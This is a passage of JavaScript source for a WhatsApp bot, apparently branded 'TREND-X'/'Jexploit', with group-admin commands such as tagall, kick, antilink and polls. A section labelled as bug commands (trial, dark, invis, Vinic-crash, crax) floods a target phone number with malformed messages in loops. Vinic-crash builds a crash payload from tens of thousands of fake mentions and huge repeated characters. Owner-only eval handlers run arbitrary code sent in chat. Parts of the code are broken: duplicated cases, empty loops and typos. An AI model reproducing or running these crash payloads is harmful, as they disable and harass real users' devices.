            '💻 *HACKING SEQUENCE INITIATED...* 💻',
            '',
            '*Loading encryption bypass modules...* 🔐',
            '*Establishing secure connection to mainframe...* 🌐',
            '*Deploying rootkits...* 🛠️',
            '',
            '```[▓▓                    ] 10%``` ⏳',
            '```[▓▓▓▓▓                ] 30%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓           ] 50%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓       ] 70%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] 90%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%``` ✅',
            '',
            '🔒 *System Breach Successful!* 🔓',
            '*Gaining access to server logs...* 🖥️',
            '*Extracting sensitive data...* 📂',
            '',
            '```[DATA CAPTURED: 3.2GB]``` 📡',
            '```[TRANSMISSION SECURED]``` 🔒',
            '',
            '🚀 *Operation Complete!*',
            '',
            '⚠️ _This is a simulated hacking activity for entertainment purposes._',
            '⚠️ _Remember: Ethical hacking ensures safety._',
            '',
            '> *TREND X: HACKING SIMULATION COMPLETE* ☣'
        ];

        for (const step of steps) {
            await conn.sendMessage(from, { text: step }, { quoted: mek });
            await new Promise(resolve => setTimeout(resolve, 1200)); // Adjust delay for realism
        }
    } catch (error) {
        console.error(error);
        reply(`❌ *Error:* ${error.message}`);
    }
}
break
case "facebook": {
if (!text) return reply(`*Please provide a Facebook video url!*`);
    
    try {
      var dlink = await fetchJson(`https://yt5s.io/api/ajaxSearch'${text}`);
      var dlurl = dlink.data.high;
      
      await conn.sendMessage(m.chat, {
        video: {
          url: dlurl,
          caption: global.botname
        }
      }, {
        quoted: m
      });
    } catch (error) {
      reply(global.mess.error);
    }
}
break 
case "hidetag": case "h": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !Access) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
let members = groupMembers.map(a => a.id)
conn.sendMessage(m.chat, {text : q ? q : 'Jexploit Is Always Here', mentions: members}, {quoted:m})
}
break
case "listactive": {
if (!m.isGroup) return reply(mess.group);

    const activeUsers = await GroupDB.getActiveUsers(from);
    if (!activeUsers.length) return reply('*No active users found in this group.*');

    let message = `📊 *Active Users in Group*\n\n`;
    message += activeUsers.map((user, i) => `🔹 ${i + 1}. @${user.jid.split('@')[0]} - *${user.count} messages*`).join('\n');

    await conn.sendMessage(m.chat, { text: message, mentions: activeUsers.map(u => u.jid) }, { quoted: m });
}
break
case "tagall": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.admin);

    let me = m.sender;
    let q = m.text.split(' ').slice(1).join(' ').trim(); // Extract the message after the command
    let teks = `*TAGGED BY:* @${me.split("@")[0]}\n\n*MESSAGE:* ${q || "No message"}\n\n`;
    
    for (let mem of participants) {
        teks += `@${mem.id.split("@")[0]}\n`;
    }
    
    conn.sendMessage(
        m.chat,
        {
            text: teks,
            mentions: participants.map((a) => a.id),
        },
        {
            quoted: m,
        }
    );
}
break
case "close": {
  if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);

        conn.groupSettingUpdate(m.chat, "announcement");
        reply("Group closed by admin. Only admins can send messages.");
}
break
case "delgrouppp": {
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);
        
        await conn.removeProfilePicture(from);
        reply("Group profile picture has been successfully removed.");
}
break
case "setdesc": {
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text) return reply("*Please enter a text*");
        
        await conn.groupUpdateDescription(m.chat, text);
        reply(mess.done);
}
break
case "disappear": {
try {
if (!isAdmins) return reply("❌ Only admins can change disappearing messages");

        const action = args[0]?.toLowerCase();
        
        if (action === 'on') {
            const duration = args[1]?.toLowerCase();
            let seconds;
            
            switch (duration) {
                case "24h": seconds = 86400; break;
                case "7d": seconds = 604800; break;
                case "90d": seconds = 7776000; break;
                default: 
                    return reply("❌ Invalid duration! Use 24h, 7d, or 90d");
            }

            await conn.groupSettingUpdate(from, 'disappearing_messages', seconds);
            reply(`✅ Disappearing messages enabled for ${duration}`, {
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            
        } else if (action === 'off') {
            await conn.groupSettingUpdate(from, 'disappearing_messages', false);
            reply("✅ Disappearing messages disabled", {
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            
        } else {
            reply("ℹ️ Usage: .disappear <on/off> [24h/7d/90d]");
        }
    } catch (error) {
        console.error("Disappear Error:", error);
        reply("❌ Failed to update disappearing messages");
    }
}
break
case "promote": {
try {
        if (!isAdmins) return reply("❌ Only admins can promote members");
        if (!isBotAdmins) return reply("❌ Bot needs admin privileges");
        
        const userId = mentionedJid?.[0] || m.quoted?.sender;
        if (!userId) return reply("ℹ️ Please mention or quote the user to promote");

        const admins = await getGroupAdmins(participants);
        if (admins.includes(userId)) return reply("ℹ️ User is already an admin");

        await conn.groupParticipantsUpdate(from, [userId], "promote");
        reply(`✅ User @${userId.split('@')[0]} is now an admin`, { 
            mentions: [userId],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("Promote Error:", error);
        reply("❌ Failed to promote user");
    }
}
break
case "demote": {
if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);

        let bwstq = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bwstq], "demote");
        reply(mess.done);
}
break
case " listonline": {
if (!m.isGroup) return reply(mess.group);
    
    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
    let presences = store.presences[id];
    
    if (!presences) {
      return reply('*No online members detected in this group.*');
    }

    let online = [...Object.keys(presences), botNumber];
    let liston = 1;
    conn.sendText(m.chat, '*ONLINE MEMBERS IN THIS GROUP*\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online });
}
break
case "editinfo": {
if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);

        if (args[0] === "on") {
            await conn.groupSettingUpdate(m.chat, "unlocked").then(
                (res) => reply(`*Successful, members can edit group info*`)
            );
        } else if (args[0] === "off") {
            await conn.groupSettingUpdate(m.chat, "locked").then((res) =>
                reply(`*Successful, members cannot edit group info*`)
            );
        } else {
            reply(`Example ${prefix + command} on/off`);
        }
}
break
case "invite": {
if (!m.isGroup) return reply(mess.group);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text)
            return reply(
                `*Enter the number you want to invite to this group*\n\nExample :\n${prefix + command} 256742932677`
            );
        if (text.includes("+"))
            return reply(`*Enter the number together without* *+*`);
        if (isNaN(text))
            return reply(
                `*Enter only the numbers with your country code without spaces*`
            );

        let group = m.chat;
        let link = "https://chat.whatsapp.com/" + (await conn.groupInviteCode(group));
        await conn.sendMessage(text + "@s.whatsapp.net", {
            text: `*GROUP INVITATION*\n\nSomeone invites you to join this group: \n\n${link}`,
            mentions: [m.sender],
        });
        reply(`*Successfully sent invite link*`);
}
break
case "linkgc": {
if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.admin);

    let response = await conn.groupInviteCode(m.chat);
    conn.sendText(
      m.chat,
      `*GROUP LINK*\n\n*NAME:* ${groupMetadata.subject}\n\n*OWNER:* ${groupMetadata.owner !== undefined ? "+" + groupMetadata.owner.split`@`[0] : "Unknown"}\n\n*ID:* ${groupMetadata.id}\n\n*LINK:* https://chat.whatsapp.com/${response}\n\n*MEMBERS:* ${groupMetadata.participants.length}`,
      m,
      {
        detectLink: true,
      }
    );
}
break
case "closetime": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isCreator) return reply(mess.notadmin);
    if (!isBotAdmins) return reply(mess.admin);

    // Check if both arguments are provided
    if (!args[0] || !args[1]) {
        return reply("*Usage:*\n.closetime [duration] [unit]\n\n*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    const duration = args[0];
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Closing group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "announcement");
        reply("*Group closed by admin. Only admins can send messages.*");
    }, timer);
}
break
case "opentime": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isCreator) return reply(mess.notadmin);
    if (!isBotAdmins) return reply(mess.admin);

    const duration = args[0];
    if (!args[1] || typeof args[1] !== 'string') return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Opening group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("*Group opened by admin. Members can now send messages.*");
    }, timer);
}
break
case "totalmembers": {
if (!m.isGroup) return reply(mess.group);
    if (!(isGroupAdmins || isCreator)) return reply(mess.admin);

    await conn.sendMessage(
      m.chat,
      {
        text: `*GROUP*: ${groupMetadata.subject}\n*MEMBERS*: ${participants.length}`,
      },
      { quoted: m, ephemeralExpiration: 86400 }
    );
}
break
case "mediatag": {
     if (!m.isGroup) return reply(mess.group);
        if (!isBotAdmins) return reply(mess.admin);
        if (!isAdmins) return reply(mess.admin);
        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);

        conn.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
}
break
case "poll": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
        let [poll, opt] = text.split("|");
        if (text.split("|") < 2)
            return await reply(
                `Enter a question and at least 2 options\nExample: ${prefix}poll Who is best player?|Messi,Ronaldo,None...`
            );
        let options = [];
        for (let i of opt.split(",")) {
            options.push(i);
        }
        
        await conn.sendMessage(m.chat, {
            poll: {
                name: poll,
                values: options,
            },
        });
}
break
case "antilink": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isCreator) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.botAdmin);
    
    // Load antilink groups from database
    const antilinkPath = './start/lib/database/antilink.json';
    let antilinkGroups = [];
    try {
        antilinkGroups = JSON.parse(fs.readFileSync(antilinkPath, 'utf-8')) || [];
    } catch (e) {
        fs.writeFileSync(antilinkPath, JSON.stringify([]));
    }

    if (args.length < 1) return reply(`Example: ${prefix + command} on/off\n\non - Enables anti-link protection\noff - Disables anti-link protection`);

    const option = args[0].toLowerCase();
    if (!["on", "off"].includes(option)) return reply("Invalid option. Use: on or off");

    // Update antilink status
    if (option === "on") {
        if (antilinkGroups.includes(m.chat)) return reply("✅ Anti-link is already active in this group");
        antilinkGroups.push(m.chat);
    } else {
        if (!antilinkGroups.includes(m.chat)) return reply("❌ Anti-link is already disabled in this group");
        antilinkGroups = antilinkGroups.filter(chat => chat !== m.chat);
    }

    // Save to database
    fs.writeFileSync(antilinkPath, JSON.stringify(antilinkGroups, null, 2));

    // Add message event listener if not already present
    if (option === "on") {
        conn.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const message = messages[0];
                if (!message || !message.key || !message.key.remoteJid || !antilinkGroups.includes(message.key.remoteJid)) return;

                // Safely access message content
                const messageContent = message.message || {};
                const urls = detectUrls(messageContent);
                if (urls.length > 0) {
                    await handleLinkViolation(message, urls);
                }
            } catch (error) {
                console.error('Error in antilink handler:', error);
            }
        });
    }

    reply(`Anti-link protection has been ${option === "on" ? "enabled" : "disabled"} for this group`);
    break;

    // Helper functions
    function detectUrls(messageContent) {
        if (!messageContent) return [];
        
        const text = messageContent.conversation || 
                    (messageContent.extendedTextMessage && messageContent.extendedTextMessage.text) || 
                    (messageContent.imageMessage && messageContent.imageMessage.caption) || 
                    (messageContent.videoMessage && messageContent.videoMessage.caption) || '';
        
        // Detect URLs with common domains
        const urlRegex = /(https?:\/\/)?(www\.)?([a-zA-Z0-9-]+\.)?(whatsapp\.com|chat\.whatsapp\.com|facebook\.com|fb\.com|instagram\.com|twitter\.com|x\.com|t\.me|telegram\.me|telegram\.org|youtube\.com|youtu\.be|tiktok\.com|discord\.gg|discord\.com|snapchat\.com|reddit\.com|linkedin\.com)/gi;
        const matches = text.match(urlRegex);
        return matches ? matches : [];
    }

    async function handleLinkViolation(message, urls) {
        try {
            const sender = message.key.participant || message.key.remoteJid;
            const groupMetadata = await conn.groupMetadata(message.key.remoteJid).catch(() => null);
            
            if (!groupMetadata) return;
            
            const isAdmin = groupMetadata.participants.find(p => p.id === sender)?.admin;

            // Allow admins to post links
            if (isAdmin) return;

            // Delete the message
            await conn.sendMessage(message.key.remoteJid, {
                delete: {
                    remoteJid: message.key.remoteJid,
                    fromMe: message.key.fromMe,
                    id: message.key.id,
                    participant: sender
                }
            }).catch(() => {});

            // Warn the user
            await conn.sendMessage(message.key.remoteJid, {
                text: `⚠️ @${sender.split('@')[0]}, links are not allowed in this group!\nYour message containing "${urls[0]}" has been deleted.`,
                mentions: [sender]
            }, { quoted: message }).catch(() => {});

            // Log the violation
            console.log(`Deleted link from ${sender} in ${message.key.remoteJid}`);
            
        } catch (error) {
            console.error('Error handling link violation:', error);
        }
    }
}
break
case "setgroupname": {
if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text) return reply("*Desired groupname?*");

        await conn.groupUpdateSubject(m.chat, text);
        reply(mess.done);
}
break
case "tagadmin": {
    if (!m.isGroup) return reply(mess.group);

    const groupAdmins = participants.filter((p) => p.admin);
    const listAdmin = groupAdmins
      .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
      .join("\n");
    const owner = groupMetadata.owner || groupAdmins.find((p) => p.admin === "superadmin")?.id || m.chat.split`-`[0] + "@s.whatsapp.net";
    let text = `*Group Admins Here:*\n${listAdmin}`.trim();

    conn.sendMessage(
      m.chat,
      { text: text, mentions: [...groupAdmins.map((v) => v.id), owner] },
      { quoted: m }
    );
}
break
case "open": {
if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);

        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("Group opened by admin. Members can now send messages.");
}
break
case "add": {
if (!m.isGroup) return m.reply(mess.group);
        if (!isCreator) return m.reply(mess.owner);
        
        let bws = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bws], "add");
        reply(mess.done);
}
break
case "kick": {
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);

        let bck = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bck], "remove");
        reply(mess.done);
}
break
case "resetlinkgc": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !Access) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

conn.groupRevokeInvite(from)
reply("*group link reseted by admin*" )
}
//bug command
break
case "trial":{
if(!Access) return reply("*Used by owner only*")
if(!text) return reply(`Example: ${prefix + command} 25672345...`)
const target = q.replace(/[^0-9]/g,"") + "@s.whatsapp.net"
await bugload()
reply(`TREND-𝙓 𝙨𝙚𝙣𝙙𝙞𝙣𝙜 𝙗𝙪𝙜𝙨 𝙩𝙤 ${target}`)
//sending bugs
for(let i = 0; i < 40; i++){
//loading the bugs using the function
await Trial(target)
await Trial(target)
await Trial(target)
await sleep(2000) //2minutes pause time
await Trial(target)
await Trial(target)
}
reply(`𝗦𝘂𝗰𝗰𝗲𝘀𝙨 𝘀𝗲𝗻𝘁 𝗯𝘂𝗴𝘀 𝘁𝗼 ${target}\n Command: ${command}`)
}
break
case "dark":{
if(!Access) return reply(mess.owner)
if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*dark* 256689...")
target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await bugLoad()

     conn.sendMessage(m.chat, {  
            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘TREND 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `120363401765045963@newsletter` 
                },
                
            }
        },{ quoted: st }
    )
for(let i = 0; i < 30; i++){
await RB(target)
await RB(target)
await RB(target)
await sleep(1500)
await RB(target)
await RB(target)
await sleep(1500)
await RB(target)

}
}

break
case "dark": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*dark* 256689...")
    
    // Initialize q properly before using it
    const q = text.trim()
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
    
    await bugLoad()

    try {
        // Send initial message
        await conn.sendMessage(m.chat, {  
            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘TREND-X 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `120363401765045963@newsletter` 
                },
            }
        }, { quoted: st })

        // Perform the repeated actions
        for(let i = 0; i < 30; i++) {
            await RB(target)
            await RB(target)
            await RB(target)
            await sleep(1500)
            await RB(target)
            await RB(target)
            await sleep(1500)
            await RB(target)
        }
    } catch (error) {
        console.error("Error in dark command:", error)
        reply("An error occurred while processing the command.")
    }
}
break
case "delaycombo":{
if(!Access) return reply(mess.owner)
if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
let vc = q.replace(/[^0-9]/g,'')
const target = vc + "@s.whatsapp.net"
await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
await bugLoad ()
    conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘TREND 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `120363401765045963@newsletter` 
                },
                
            }
        },{ quoted: st }
    )

for(let r = 0; r < 40; r++){

}
}
break
case "invis": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
    let q = text.trim() // Initialize q with the text content
    let vc = q.replace(/[^0-9]/g,'')
    const target = vc + "@s.whatsapp.net"
    await conn.sendMessage(m.chat, {react: {text: '🦅', key: m.key}});
    await bugLoad()
    
    conn.sendMessage(m.chat, {  
        image: { url: "https://files.catbox.moe/adymbp.jpg" },  
        caption: buggy,   
        contextInfo: {
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "☘TREND-X 𝗧𝗘𝗖𝗛☘",
                newsletterJid: `120363401765045963@newsletter` 
            },
        }
    }, { quoted: st })

    for(let r = 0; r < 40; r++) {
        await delayonly(target)
        await delayonly(target)
        await delayonly(target)
        await sleep(2000)
        await delayonly(target)
        await delayonly(target)
        await delayonly(target)
        await sleep(1500)
        await delayonly(target)
        await delayonly(target)
    }
}
break
case "Vinic-crash": {
if(!Access) return reply(mess.owner)
if(!text) return reply(`Example:
${command} 254xxx`)
async function newsletterSqL(target, ptcp = true) {
    
    const img300 = require('./folder/folder/image.jpg')
    
    const mentionedList = [
    target, ...Array.from({ length: 35000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '120363401765045963@newsletter',
                        newsletterName: "TREND-X",
                        jpegThumbnail: img300,
                        caption: "ꦾ".repeat(60000),
                        inviteExpiration: Date.now() + 9999999999,
                    },
                },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: mentionedList,
              stanzaId: conn.generateMessageTag(),
            },
        };

        await conn.relayMessage(target, message, {
          userJid: target,
        });
    } catch (error) {
        console.log("error:\n" + error);
      }
   }
}
break
case "invis": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
    let q = text // Initialize 'q' with the input text (minimal change)
    let vc = q.replace(/[^0-9]/g,'')
    const target = vc + "@s.whatsapp.net"
    await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
    await bugLoad()
    conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/adymbp.jpg" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `` 
                },
            }
        },{ quoted: st }
    )
    for(let r = 0; r < 40; r++){
        await delayonly(target)
        await delayonly(target)
        await delayonly(target)
        await sleep(2000)
        await delayonly(target)
        await delayonly(target)
        await delayonly(target)
        await sleep(1500)
        await delayonly(target)
        await delayonly(target)
    }
}
break
case "crax":{
if(!Access) return reply(mess.owner)
if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xxx`)
let vc = q.replace(/[^0-9]/g,'')
const target = vc + "@s.whatsapp.net"
const ment = false
await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
await bugLoad()
    conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘TREND-X 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `` 
                },
                
            }
        },{ quoted: st }
    )
    
for(let r = 0; r < 50; r++){

}

}

break
        
case 'backup':
case 'bp': {
if (!Access) return reply(mess.owner)
const sessionPath = "./session";
if (fs.existsSync(sessionPath)) {
const files = fs.readdirSync(sessionPath);
files.forEach((file) => {
if (file !== "creds.json") {
const filePath = path.join(sessionPath, file); 
if (fs.lstatSync(filePath).isDirectory()) {
fs.rmSync(filePath, { recursive: true, force: true });
} else {  
fs.unlinkSync(filePath);
}
}
}
);
}
const ls = execSync("ls").toString().split("\n").filter(
(pe) =>           
pe != "node_modules" &&   
pe != "package-lock.json" &&  
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
execSync(`zip -r backup.zip ${ls.join(" ")}`);
await conn.sendMessage(m.chat, {
document: fs.readFileSync("./backup.zip"),   
fileName: "Jexploit-base-new.zip",
mimetype: "application/zip",
caption: "ini adalah file backup mu",
}, { quoted: m });
execSync("rm -rf backup.zip");
}
break
        
default:
if (body.startsWith("~")) {
if (!Access) return;
console.log('*execute...*')
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
let bang = util.format(sat)
if (sat === undefined) {
bang = util.format(sul)
}
return bang;
}
try {
(async () => {
try {
const result = await eval(`(async () => { return ${text} })()`)
console.log(Return(result))
} catch (e) {
console.log(util.format(e))
}
})()
} catch (e) {
console.log(util.format(e))
}
}
if (budy.startsWith("X")) {
if (!Access) return
await reaction(m.chat, '⚡')
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
conaole.log(evaled)
} catch (err) {
console.log(util.format(err))
}
}
}
} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
